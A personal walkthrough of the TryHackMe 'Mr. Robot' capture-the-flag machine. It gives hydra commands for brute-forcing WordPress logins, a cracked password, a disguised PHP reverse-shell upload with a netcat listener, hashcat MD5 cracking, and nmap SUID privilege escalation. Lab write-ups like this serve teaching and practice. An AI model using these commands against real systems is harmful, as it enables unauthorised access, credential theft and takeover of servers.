# Mr. Robot CTF, TryHackMe

## 2024-01-12, Joakim Oscarsson

### Solution

### gobuster with dict file
/images               (Status: 301) [Size: 232] [--> http://10.10.5.6/images/]
/css                  (Status: 301) [Size: 229] [--> http://10.10.5.6/css/]
/image                (Status: 301) [Size: 0] [--> http://10.10.5.6/image/]
/license              (Status: 200) [Size: 309]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.5.6/feed/]
/video                (Status: 301) [Size: 231] [--> http://10.10.5.6/video/]
/audio                (Status: 301) [Size: 231] [--> http://10.10.5.6/audio/]
/admin                (Status: 301) [Size: 231] [--> http://10.10.5.6/admin/]
/blog                 (Status: 301) [Size: 230] [--> http://10.10.5.6/blog/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.5.6/Image/]
/intro                (Status: 200) [Size: 516314]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.5.6/feed/]
/login                (Status: 302) [Size: 0] [--> http://10.10.5.6/wp-login.php]
/readme               (Status: 200) [Size: 64]
/Year201120102009200820072006200520042003200220012000199919981997199619951994199319921991199019891988198719861985198419831982198119801979197819771976197519741973197219711970196919681967196619651964196319621961196019591958195719561955195419531952195119501949194819471946194519441943194219411940193919381937193619351934193319321931193019291928192719261925192419231922192119201919191819171916191519141913191219111910190919081907190619051904190319021901

### hydra username and password cracking

hydra -L ./fsocity.dic -p admin 10.10.5.6 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid user"

Gave username Elliot

Now we want the password as well, add the last part from fsocity.dic to the shortened version

run hydra again with

hydra -l elliot -P ./fsocity.dic 10.10.5.6 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"

Success, we got password ER28-0652.

### wordpress

Inside wordpres we found another user: mich05654, lets try to hack her password.

hydra -l mich05654 -P ./fsocity.dic 10.10.184.242 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"


### Wordpress reverse shell

Wordpress usually have a bunch of vulnerabilities. Lets browse through to plugins first...

We activate all the plugins there is and then we test wpscan to see if there are any vulnerabilities.

How to gain reverse shell with image upload:
https://infosecwriteups.com/bypassed-and-uploaded-a-sweet-reverse-shell-d15e1bbf5836

We renamed the shell as shell.png.php and then the image upload worked.

So we uploaded a php reverse shell, calling to IP 10.8.184.253. Then we started netcat with the command: 
nc -lvp 4444 and got a shell running.

After getting the shell, we ran python -c 'import pty; pty.spawn("/bin/bash)'  to get some more persistance. 

In /home/robot there was a password saved as an md5 hash, the hash was cracked using hashcat.

### hashcat

To crack the md5 password hash we used the command:
hashcat -m 0 -a 0 pass_hash.hash fsocity.txt (m is type of hash and 0 mean md5, a is type of attack 0 is dictionary attack)

### get 2nd key

After the password was cracked we signed in as robot by issuing the su command, entered  the password and then cat out the key.

### get 3rd key

Now we need to escalate our privileges to root. By the hint we see that wee should use nmap in some way. By running find / -perm /4000 2>/dev/null we see that nmap has the SUID bit set. Then we look into gtfobins and find that the command nmap --interactive can be used to elevete out privileges to root. After that we cat our third key from /root.

### Misc about Wordpress vulnerabilities

Reverse shell as soon as admin
https://www.hackingarticles.in/wordpress-reverse-shell/

Link to different ways of getting reverse shell on a wordpress website.
https://www.hackercoolmagazine.com/wordpress-reverse-shelling-multiple-methods/





